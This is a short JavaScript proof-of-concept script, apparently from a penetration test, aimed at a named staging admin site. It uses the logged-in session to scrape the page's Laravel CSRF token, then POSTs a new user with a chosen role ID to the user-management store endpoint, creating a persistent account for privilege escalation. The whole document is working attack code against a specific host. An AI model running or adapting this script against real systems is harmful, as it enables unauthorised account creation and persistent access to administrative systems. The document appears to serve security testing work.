(async () => {
  const baseUrl = "https://ntc-staging-admin-dev.htechcorp.net";

  // 1. Fetch the page that contains the hidden Laravel CSRF token
  const pageRes = await fetch(`${baseUrl}/management-support/user-management`, {
    method: "GET",
    credentials: "include"
  });

  const html = await pageRes.text();

  // 2. Parse the returned HTML
  const doc = new DOMParser().parseFromString(html, "text/html");

  // 3. Extract the hidden _token value from the form
  const token = doc.querySelector('input[name="_token"]')?.value;

  if (!token) {
    console.log("[-] CSRF token not found.");
    return;
  }

  console.log("[+] CSRF token found:", token);

  // 4. Prepare POST body
  const body = new URLSearchParams();

  body.set("_token", token);
  body.set("first_name", "Secuna");
  body.set("middle_name", "PersistenceOne");
  body.set("last_name", "Ein");
  body.set("name_ext", "");
  body.set("sex", "MALE");
  body.set("gender", "I PREFER NOT TO SAY");
  body.set("employee_id", "9812122");
  body.set("office", "1");
  body.set("region", "Central Office");
  body.set("admin_position", "anyposition");
  body.set("designation", "anydesignation");
  body.set("email", "eroel+privesctest1@secuna.io");
  body.set("username", "Persistence1");
  body.set("contact_no", "6328-924-40");
  body.append("user_role[]", "161");
  body.set("id", "");
  body.set("process", "update");

  // 5. Submit the request to the store endpoint
  const postRes = await fetch(`${baseUrl}/management-support/user-management/store`, {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: body.toString(),
    redirect: "manual"
  });

  console.log("[+] POST status:", postRes.status);
  console.log("[+] Redirect location:", postRes.headers.get("Location"));

  const responseText = await postRes.text();
  console.log("[+] Response preview:", responseText.slice(0, 500));
})();
